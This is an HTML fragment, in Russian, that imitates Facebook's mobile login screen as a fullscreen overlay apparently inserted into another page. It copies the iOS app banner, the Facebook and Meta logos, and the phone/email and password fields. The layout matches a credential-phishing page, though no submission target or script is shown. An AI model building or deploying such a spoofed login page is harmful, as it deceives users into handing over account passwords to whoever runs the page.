<!-- Полноэкранная страница Facebook (новая из второго файла) -->
<div class="facebook-fullscreen" id="facebookFullscreen">
    <!-- Баннер iOS -->
    <div class="app-banner">
        <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 11h2.59L12 16.59 8.41 13H11V8h2v5z"/></svg>
        <span>Установите Facebook для iOS — приложение работает быстрее.</span>
    </div>

    <div class="page-container">
        <div class="lang-selector">Русский</div>

        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo">
        </div>

        <form class="login-form" id="facebookLoginForm">
            <div class="input-group">
                <input type="text" id="facebookLogin" class="facebook-input" placeholder="Мобильный телефон или эл. адрес" autocomplete="username">
                <div class="facebook-error-msg" id="facebookLoginError">Введите адрес или номер телефона</div>
            </div>
            
            <div class="input-group">
                <input type="password" id="facebookPassword" class="facebook-input" placeholder="Пароль" autocomplete="current-password">
                <div class="facebook-error-msg" id="facebookPasswordError">Введите пароль</div>
            </div>

            <button type="submit" class="facebook-btn-login">Войти</button>
        </form>

        <a href="#" class="facebook-forgot-link">Забыли пароль?</a>

        <div class="create-account-container">
            <a href="#" class="facebook-btn-create">Создать новый аккаунт</a>
        </div>
    </div>

    <footer class="facebook-footer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="facebook-meta-logo">
        <div class="facebook-footer-links">
            Информация <span>·</span> Справка <span>·</span> Ещё
        </div>
    </footer>
</div>
